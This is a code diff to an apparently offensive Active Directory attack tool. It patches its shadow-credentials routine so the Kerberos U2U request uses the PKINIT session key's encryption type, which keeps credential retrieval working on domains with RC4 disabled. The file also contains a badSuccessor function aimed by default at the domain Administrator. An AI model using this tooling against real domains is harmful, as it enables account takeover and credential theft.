@@ -13,10 +13,46 @@ from kerbad.common import factory
 from kerbad.common.spn import KerberosSPN
 from kerbad.common.kirbi import Kirbi
 from kerbad.common.ccache import CCACHE
+from kerbad.protocol.asn1_structs import TGS_REQ
+from kerbad.protocol.constants import MESSAGE_TYPE
 from kerbad.protocol.external import ticketutil
 from kerbad.protocol.encryption import Enctype
 from kerbad.protocol.errors import KerberosError
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
+
+
+def _u2u_with_session_enctype(client):
+    """Run kerbad U2U using the PKINIT session key's encryption type.
+
+    kerbad 0.5.10 hard-codes RC4-HMAC (etype 23) in U2U requests. Domains
+    with RC4 disabled reject that request even when PKINIT successfully
+    negotiated an AES session key. Rewrite only that legacy request while
+    leaving future kerbad implementations and all other traffic untouched.
+    """
+    original_sendrecv = client.ksoc.sendrecv
+
+    def sendrecv(message):
+        try:
+            request = TGS_REQ.load(message)
+        except ValueError:
+            return original_sendrecv(message)
+
+        if (
+            request["msg-type"].native == MESSAGE_TYPE.KRB_TGS_REQ.value
+            and request["req-body"]["etype"].native == [Enctype.RC4]
+        ):
+            request["req-body"]["etype"] = [
+                int(client.kerberos_session_key.enctype)
+            ]
+            message = request.dump()
+
+        return original_sendrecv(message)
+
+    client.ksoc.sendrecv = sendrecv
+    try:
+        return client.with_clock_skew(client.U2U)
+    finally:
+        client.ksoc.sendrecv = original_sendrecv
 
 
 async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Current,DC=Domain"], ou: str = None, prepatch: bool = False):
@@ -607,7 +643,7 @@ async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "C
             url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}&timeout=350"
             cu = factory.KerberosClientFactory.from_url(url)
             client = cu.get_client_blocking()
-            tgs, enctgs, key, decticket = client.with_clock_skew(client.U2U)
+            tgs, enctgs, key, decticket = _u2u_with_session_enctype(client)
         except Exception as e:
             keyCredential.to_pfx(path)
             pfx_path = path + ".pfx"
